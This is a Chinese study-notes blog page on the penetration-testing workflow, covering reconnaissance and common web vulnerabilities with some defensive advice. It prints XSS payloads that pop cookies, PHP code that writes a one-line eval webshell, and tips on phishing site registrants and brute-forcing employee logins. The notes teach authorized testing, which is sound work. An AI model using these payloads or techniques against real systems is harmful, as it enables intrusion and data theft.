<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="测试流程学习总结, wiki">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>测试流程学习总结 | wiki</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 4.2.0"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">wiki</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">wiki</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('本文章暂不公开')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://imgpub.chuangkit.com/designTemplate/2020/08/10/0406bd9b-65bc-47ab-99ef-3d714e0118c0_thumb?v=1597711562000&x-oss-process=image/resize,w_600/format,webp')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">测试流程学习总结</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/web/">
                                <span class="chip bg-color">web</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2020-09-10
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2020-09-10
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    21 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h1><p>渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络所有者根据渗透人员提供的渗透测试报告，可以清晰知晓系统中存在的安全隐患和问题。</p>
<h2 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h2><p>拿到一个合法的渗透测试项目时，我们首先应该明确客户要求我们进行渗透测试的范围以及整体项目的时间。</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><strong>搜集哪些信息？</strong></p>
<ul>
<li>Whois信息<ul>
<li>注册人名字、邮箱等</li>
<li>查询工具：<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com</a></li>
</ul>
</li>
<li>IP信息（服务器的IP）<ul>
<li>判断是否为CDN节点，查询同IP网站，端口扫描</li>
<li>多地ping工具：<a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a></li>
<li>这个工具可以检测旁站：<a href="http://tool.chinaz.com/same/" target="_blank" rel="noopener">http://tool.chinaz.com/same/</a></li>
</ul>
</li>
<li>目录信息<ul>
<li>判断WEB应用，获取网站后台目录，获取其他</li>
<li>工具：AWVS、御剑。</li>
</ul>
</li>
<li>服务信息<ul>
<li>判断服务，例如：IIS、Apache</li>
</ul>
</li>
<li>脚本信息<ul>
<li>ASP、PHP、<code>aspx</code>（asp.net）</li>
</ul>
</li>
<li>框架信息<ul>
<li>ThinkPHP、Struts等</li>
</ul>
</li>
<li>应用信息<ul>
<li>应用，dedecms、phpcms等</li>
</ul>
</li>
<li>子域名信息<ul>
<li><code>xxx.xx.com</code> <code>xxx.xxx.xx.com</code></li>
</ul>
</li>
</ul>
<h3 id="whois信息查询"><a href="#whois信息查询" class="headerlink" title="whois信息查询"></a>whois信息查询</h3><p>当拿到一个域名的时候，我们首先应该进行whois查询，可以使kali 下面的 whois命令或者使用在线工具，比如说<a href="http://m.whois.chinaz.com/" target="_blank" rel="noopener">whois查询</a>，通过查询域名的注册人信息，我们可以对其进行社工钓鱼。或者我们可以有针对性的利用其信息生成字典，对后台或者其他登录功能进行爆破。</p>
<h3 id="IP信息查询"><a href="#IP信息查询" class="headerlink" title="IP信息查询"></a>IP信息查询</h3><p><strong>域名查询真实IP</strong></p>
<p>当然，如果连真实ip都没有找到的话。相当于连门都没有找到，这里最头疼的就是企业常常为了增强网页访问速度为服务加cdn，如何查看是否做了cdn？这里我们可以利用<code>nslookup url</code>这个命令，如果说做了cdn那么会返回多个ip信息，当然也可以使用不同地点的vps去ping一下域名，做了cdn的话返回ip是不一样的。</p>
<p><strong>绕过cdn查询真实IP</strong></p>
<p>这里简单说一下有哪些方式可以绕过cdn查询真实ip：<br>1、<strong>查询子域：</strong>直接查看子域名的ip，一般企业都只会对主域名做cdn，而常常忽略了子域名<br>2、<strong>查询历史dns记录</strong>，如果存在做了cdn之前的记录也是可以查到真实ip的<br>笔者这里推荐一个网站<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">dns查询</a><br>3、<strong>查询邮件：</strong>还可以使用对方的邮件服务，或者是rss订阅服务，当目标给你发送了一条消息也可以从消息中找到真实ip，让站点主动发送邮件，然后右键查询源代码，就能获得真实 IP。<br>4、<strong>通过国外冷门 DNS 查询域名：</strong>国内部分 CDN 服务只针对国内，对国外的访问几乎不使用 CDN。所以我们可以通过国外冷门 DNS 查询域名。利用国外的vps去ping一下域名或者使用nslookup更改dns为国外的dns都可能查到其真实ip。</p>
<p>例如：nslookup xxx.com 199.89.126.10</p>
<p>5、<strong>让服务器去访问你的vps</strong>，比如说这个网址有设置头像的方式，并且可以直接填写头像的url，那么我们可以把图片放在自己vps上提交给服务器，那么也可以从日志中得到真实ip。<br>6、<strong>利用phpinfo</strong>，当然这个情况还是比较少的，因为一般都会把phpinfo给删除</p>
<h3 id="目录信息查询"><a href="#目录信息查询" class="headerlink" title="目录信息查询"></a>目录信息查询</h3><ol>
<li><p>主动式扫描：爬虫、暴力破解</p>
<ul>
<li>AVWS：根据站点的链接（见“工具篇 AVWS”一节）</li>
<li><a href="http://www.jb51.net/softs/43405.html" target="_blank" rel="noopener">御剑</a>：根据固定的字典</li>
</ul>
</li>
<li><p>被动式扫描：Burp Spider</p>
</li>
<li><p>Google Hack</p>
</li>
<li><p><code>robots.txt</code>（补充）</p>
<p>重点看<code>Disallow</code>的部分。</p>
</li>
<li><p>网络资产搜集</p>
<ul>
<li>钟馗之眼<code>www.zoomeye.com</code></li>
<li>佛法<code>https://fofa.so/</code></li>
</ul>
</li>
<li><p>服务信息查询，脚本信息，框架信息，应用信息，指纹识别</p>
</li>
<li><p>子域名信息</p>
<ul>
<li>子域名挖掘机</li>
<li>搜素引擎：<code>site:*.xxx.com</code></li>
</ul>
</li>
<li><p>个人信息</p>
<ul>
<li>社会工程学：使人们顺从你的意愿、满足你的欲望的一门艺术与学问。</li>
<li>社工库</li>
</ul>
</li>
</ol>
<p><strong>google hacking</strong></p>
<p>利用google hacking可以快速的对目标进行信息收集。<br>谷歌入侵的原理是利用谷歌去搜索包括特定文本字符串的网页。<br>例如：当我们在接到一个对学校进行渗透的项目时，我们需要拿到一些关于这个学校的邮箱，电话号码，地址等信息，我们可以这样查找xls文件类型的文件，下载下来之后发现有我们需要的东西</p>
<p><code>inurl:xxx.com filetype:xls</code></p>
<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>通过指纹识别，我们可以明确这个网站是用何种cms开发，然后我们可以利用公开的对应版本的poc进行测试，当然我们也可以将对应版本的源码下载下来进行代码审计。<br>针对一个web服务，我们应该首先明确这个是由什么语言开发的前后端，使用的什么webserver，因为不同的webserver也有不同的解析漏洞或者其他的漏洞。这里笔者推荐一款浏览器插件(wappalyzer)可以很方便的查看这些信息。我们也可以观察数据包特征或者网页加载的特殊文件来识别cms。</p>
<p><strong>指纹识别工具</strong></p>
<p>浏览器插件</p>
<p>whatweb</p>
<p><strong>历史漏洞收集</strong></p>
<p>了解目标历史漏洞对我们帮助也是非常的大，至少我们可以知道网站设计人员喜欢在什么地方犯错误，喜欢犯什么类型的错误。这样我们可以有针对性的进行渗透测试，或者说我们可以查看是否已经修补过得漏洞是否能够绕过。这里我推荐去乌云镜像网上对历史漏洞进行收集。</p>
<p><strong>利用app进行信息收集</strong></p>
<p>一些大一点的企业会有自己的 app，我们可以利用工具对其进行逆向，找出其所使用的url链接，然后进行专门的渗透测试</p>
<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>收集子域名的重要性也不言而喻了，当对主站无从下手的时候我们可以通过子域名下手，因为一个企业可能对子域名的安全不是很重视，甚至有些子域名只是内测阶段还没有上线，所以对子域名进行渗透测试是非常重要的。这里我推荐<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">李劼劼的子域名挖掘脚本</a></p>
<p><strong>敏感目录收集</strong></p>
<p>这里指的敏感目录包括但不限于网站的备份文件，未授权访问的上传页面，文本编辑器或者phpmyadmin等等目录。就拿备份文件来讲，一般人拿到以后只会查看是否有数据库账号密码进行连接，如果没有就无从下手。其实我们可以通过代码审计发现它的漏洞进行渗透测试。再比如phpmyadmin，我们可以使用爆破工具对其账号密码进行爆破。或者是之前有黑阔留下的后门文件，我们也可以爆破其密码进行利用。</p>
<p><strong>了解网站大体功能</strong></p>
<p>我们需要对整个站点的整体功能有所了解，从注册用户到更改信息更改密码等等，所有的功能都需要尽可能体验一遍，在体验的同时就应该思考这个功能可能产生什么样的漏洞。并且需要多注册几个账号，这对后面的csrf漏洞发现或者逻辑漏洞发现等等都很有帮助</p>
<p><strong>常用F12</strong></p>
<p>在浏览网站的时候，我们需要时刻打开开发者工具，时刻关注页面加载情况，这对我们发现ssrf漏洞非常有帮助，这里笔者推荐使用火狐的firebug工具.<br>针对这个问题，笔者找到了一个例子。<br><a href="http://byd.dropsec.xyz/2017/08/07/安全脉搏漏洞挖掘小记/" target="_blank" rel="noopener">具体案例参考</a></p>
<p><strong>企业员工信息收集</strong></p>
<p>拿到员工的信息，我们可以尝试使用弱密码进行登录一些内部平台，并且一些员工的邮箱的前缀很可能就是他的密码。当然，如果说当一个服务不允许多次使用错误密码登录，我们可以先确定弱口令，然后爆破收集到的账号信息去爆破哪些用户使用这个弱口令从而绕过这个防护机制。<br>针对这个问题笔者找到了相似的案例：<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0194367.html" target="_blank" rel="noopener">京东员工信息泄露</a></p>
<p><strong>针对ip</strong></p>
<p>众所周知，拿到一个ip的时候，我们一般都需要使用nmap或者其他同类扫描工具对其开放端口以及端口对应的服务进行扫描。通过端口开放情况，我们可以针对性的对其进行渗透测试，这里关于nmap的使用说明笔者不再具体阐述。<strong>需要注意的是nmap默认扫描端口是常用端口，所以我们需要在使用的时候指定扫描端口范围。</strong></p>
<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>列举一些常见漏洞</p>
<p><strong>漏洞扫描</strong></p>
<p>关于漏洞扫描的工具太多了，笔者这里仅仅推荐<a href="http://testphp.vulnweb.com/" target="_blank" rel="noopener">awvs</a><br>但是不要依赖工具，很多漏洞工具都是扫不出的，一定要结合手工测试漏洞</p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>sql注入可以说是非常常见了，相信你在挖掘这类漏洞的时候已经轻车熟路了，掌握常用的sql注入手法已经熟练使用sqlmap或者同类工具都非常重要。但是我们需要学会剑走偏锋，多去探索冷门的sql注入方法，这样才不会被过滤了某些字符的时候而束手无策。其次作为白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!</p>
<hr>
<p><strong>sql注入原理</strong></p>
<p>这里再讲一下sql注入的原理：<br>定义：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<br><strong>sql注入有以下危害：</strong><br>1、绕过认证，获得非法权限<br>2、猜解后台数据库全部的信息<br>3、注入可以借助数据库的存储过程进行提权等操作</p>
<p>因此这里我给网站运维人员提出几点建议：</p>
<ol>
<li>时刻关注自己的系统的0day漏洞并且做好修补</li>
<li>适当降低数据库的权限</li>
<li>要有一定的安全意识，对用户信息进行加密</li>
<li>不要把所有过滤只交给前台！后台同样需要做一次校验</li>
</ol>
<h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3><p>前端漏洞也是一个很大的板块，在做渗透测试的时候我们需要抓住一些细微的点，对每一个输出点都尽可能的测试，并且想方设法的去绕过。</p>
<hr>
<p>跨站脚本攻击（Cross Site Scripting），为不和层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS 。恶意攻击者往 Web 页面里插入恶意 JavaScript 代码，当用户浏览器该页之时，嵌入 Web 页面里的代码会被执行，从而达到恶意攻击用户的目的。</p>
<p>XSS过滤绕过备忘单<a href="http://cheatsheets.hackdig.com/?4.htm" target="_blank" rel="noopener">http://cheatsheets.hackdig.com/?4.htm</a></p>
<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><p>Payload 的中文含义是有效载荷，在 XSS 中指代攻击代码或攻击语句。</p>
<p>常见的 Payload 有：</p>
<ul>
<li>正常弹窗<ul>
<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li><code>&lt;img src=0 onerror=alert(1)&gt;</code></li>
</ul>
</li>
<li>弹出网站 Cookie<ul>
<li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
<li><code>&lt;img src=0 onerror=alert(document.cookie)&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>总共有三种</p>
<ul>
<li>反射型：Payload 经过后端，不经过数据库</li>
<li>存储型：Payload 经过后端，经过数据库</li>
<li>DOM：Payload 不经过后端</li>
</ul>
<h3 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h3><p>xxe漏洞不知道大家有没有过多的去关注，这类漏洞如果存在的话危害是非常大的，从读取信息到探测内网等等，很值得我们去关注</p>
<h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><p>逻辑漏洞包括任意重置用户密码，修改订单等等，这类漏洞是扫描器所不能扫描出来的，所以需要我们认真分析整个站点的功能，分析其逻辑，多用burpsuite抓包观察数据包是否可篡改，验证码是否可爆破等等。</p>
<h3 id="csrf跨站请求伪造"><a href="#csrf跨站请求伪造" class="headerlink" title="csrf跨站请求伪造"></a>csrf跨站请求伪造</h3><p>检测csrf漏洞一般是看每一个操作是否有验证码验证，是否有token或者referer,可以注册多个账户然后利用A用户生成的poc去检测B用户。</p>
<hr>
<p>CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p>
<p>CSRF 攻击的原理就是攻击者创建一个链接，受害者点击它之后就可以完成攻击者想要的操作，这些操作一般是删除文章，创建用户之类。比如某网站的删除文章链接是<code>http://www.xxx.com/post/&lt;id&gt;/delete</code>，那么攻击者可以直接构造出来发给有权限的人，它点击之后就可以将文章删除。当然，攻击者也可以使用当下流行的短网址服务来伪造 URL，避免受到怀疑。</p>
<p>与传统的认知相反， POST 方式并不能防止 CSRF，这是因为浏览器中的 JS 拥有发送 POST 请求的能力。比如攻击者可以编写一个带表单的页面，包含目标 URL 和所有所需字段，然后再用 JS 代码提交表单。之后把这个表单放到网络上可以访问的地方，再把这个链接发给受害者，诱导他点击。</p>
<p>所以这个东西也叫作“One Click”，意思就是说，整个攻击只通过一次点击来完成。换个角度，通过两次相关步骤来完成的操作就不会有这个问题。</p>
<h3 id="ssrf服务器端请求伪造"><a href="#ssrf服务器端请求伪造" class="headerlink" title="ssrf服务器端请求伪造"></a>ssrf服务器端请求伪造</h3><p>在介绍信息收集的时候说过需要常常打开F12，以便于我们发现这种漏洞</p>
<hr>
<p><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a></p>
<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>很多 Web 应用都提供了从其他服务器上获取数据的功能。使用用户指定的 URL，web 应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的 Web 应用作为代理，攻击远程和本地服务器。这种形式的攻击成为服务器请求伪造（SSRF）。</p>
<p>以下业务场景容易出现这种漏洞：</p>
<ol>
<li>应用从用户指定的 URL 获取图片，然后把它用一个随机名称保存在硬盘上，并展示给用户：</li>
<li>应用获取用户指定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 和 服务器建立 TCP 连接，传输原始数据。</li>
<li>应用根据用户提供的 URL，抓取用户的 Web 站点，并且自动生成移动 Wap 站。</li>
<li>应用提供测速功能，能够根据用户提供的 URL，访问目标站点，以获取其在对应经纬度的访问速度。</li>
</ol>
<p><strong>URL 关键词寻找</strong></p>
<p>根据对存在 SSRF 漏洞的 URL 地址特征的观察，通过我一段时间的手机，大致有一下关键字：</p>
<p>share、wap、url、image、link、src、source、target、u、3g、display、sourceUrl、imageUrl、domain</p>
<p>如果利用 google 语法（<code>inurl:url=</code>）加上这些关键字去寻找 SSRF 漏洞，耐心的验证，现在还是可以找到存在的 SSRF 漏洞。</p>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>例如：</p>
<pre><code>http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png</code></pre><p>排除法一：</p>
<p>你可以直接右键图片，在新窗口打开图片，如果浏览器上 URL 地址栏中是<code>http://www.baidu.com/img/bd_logo1.png</code>，则不存在 SSRF。</p>
<p>排除法二：</p>
<p>你可以使用 Burp 等抓包工具来判断是否是 SSRF，首先 SSRF 是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以我们本地浏览器中的请求就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是 SSRF。</p>
<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>通常有一下 5 个思路：</p>
<ol>
<li>过滤返回信息，验证远程服务器对请求的相应，是比较容易的方法。如果 Web 应用获取某种类型的文件，那么可以在把返回结果展示给用户之前先验证返回信息是否符合标准。</li>
<li>统一错误信息，避免用户根据错误信息来判断远程服务器端口状态。</li>
<li>限制请求的端口为 HTTP 常用端口，比如 80、443、8080、8090。</li>
<li>黑名单内网 IP，避免应用被用来获取内网数据，攻击内网。</li>
<li>禁用不需要的协议。仅仅允许 HTTP 和 HTTPS 请求。可以防止类似于<code>file://</code>、<code>gopher://</code>和<code>ftp://</code>等引起的问题。</li>
</ol>
<h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>这里所指的未授权包括各种空密码之类的，这种漏洞危害是不言而喻的</p>
<h3 id="弱口令，越权访问"><a href="#弱口令，越权访问" class="headerlink" title="弱口令，越权访问"></a>弱口令，越权访问</h3><p>可以通过爆破的方式发现弱口令，而越权访问又包括水平越权和垂直访问，这种漏洞我们可以观察url是否带有用户的明文信息或者直接访问一些敏感页面。</p>
<hr>
<p>越权漏洞是 Web 应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控<br>制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因<br>主要是开发人员在对数据进行增、删、改、查时对客户端请求的数据过于信任而遗<br>漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。</p>
<p><strong>分类</strong></p>
<p>水平越权：权限不变，身份改变<br>垂直越权：身份不变，权限改变</p>
<blockquote>
<p>IDC 的通俗含义是主机商，也就是卖服务器的商家。现在许多 IDC 同时也卖域名。IDC 的漏洞和域名商类似，也可能存在任意密码重置或者越权漏洞。</p>
</blockquote>
<h3 id="各种框架漏洞-中间件漏洞"><a href="#各种框架漏洞-中间件漏洞" class="headerlink" title="各种框架漏洞,中间件漏洞"></a>各种框架漏洞,中间件漏洞</h3><p>比如说structs这个框架的漏洞层出不穷，当明确了目标所使用何种框架之后，我们可以使用poc进行验证。</p>
<hr>
<p>常见的中间件：tomcat、weblogic、jBoss、jOnAS、WebSphere。</p>
<p>默认端口<br>Tomcat：8080（Web、Console）、…<br>WebLogic：7001、7002（Web、Console）、…<br>JBoss：8080（Web）、9990（Console）、…<br>WebSphere：9080、9443（Web）、9060、9043（Console）、…<br>JOnAS：9000、…</p>
<p>中间件默认路径<br>Tomcat： http://<host>:8080/manager/html<br>WebLogic： http://<host>:7001/console/<br>JOnAS： http://<host>:9000/jonasAdmin/<br>JBoss： http://<host>:9990<br>WebSphere： http://<host>:7043/ibm/console/logon.jsp</p>
<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>信息泄露即通过各种搜索手段或者查看<code>robots.txt</code>之类的铭感目录得到敏感信息</p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>当我们在遇到文件上传并且有白名单校验的时候，利用文件包含可以轻松getshell。</p>
<hr>
<p>文件包含就是将一个文件包含到自己的文件中执行。它可分为本地包含和远程包<br>含，本地包含即包含本地磁盘上的文件，文件名称是相对路径或绝对路径，远程包<br>含即包含互联网上的文件，文件名称是 URL。</p>
<p><strong>文件包含漏洞中的扩展名是任意的</strong></p>
<h3 id="命令注入-代码执行"><a href="#命令注入-代码执行" class="headerlink" title="命令注入(代码执行)"></a>命令注入(代码执行)</h3><p>命令注入的思路与sql注入思路是差不多的，都是对用户的输入过滤不严谨，关于这种漏洞笔者找到了几条相似案例：<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0191558.html" target="_blank" rel="noopener">搜狐某战点存在隐式命令注入</a><br><a href="http://www.anquan.us/static/bugs/wooyun-2015-0142702.html" target="_blank" rel="noopener">案例2</a></p>
<hr>
<p>原理：由于开发人员编写源码时，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句，并交由服务端执行。命令注入攻击中，Web 服务器没有过滤类似 system、eval 和 exec 等函数，是该漏洞攻击成功的主要原因。</p>
<p><code>http://localhost/code-exe.php?code=phpinfo();</code></p>
<blockquote>
<p><strong>可以使用 phpinfo 或者 echo 等调试函数来判定漏洞。最重要的是，可以</strong><br><strong>利用这个漏洞写入 Webshell，</strong>代码如下：<br>$file=’mst.php’; // 一句话木马的文件名<br>$person=’<?php @eval($_POST[1]);?>‘; // 一句话文件名的代码<br>file_put_contents($file,$person, FILE_APPEND | LOCK_EX); // 当key.php文件不存在会自动创建，如果存在就会添加</p>
</blockquote>
<p><strong>最后需要注意的是在进行漏洞发现的时候应该对每一个事件利用burpsuite进行抓包仔细观察数据包的传送情况，不放过任何一个可利用的点。</strong></p>
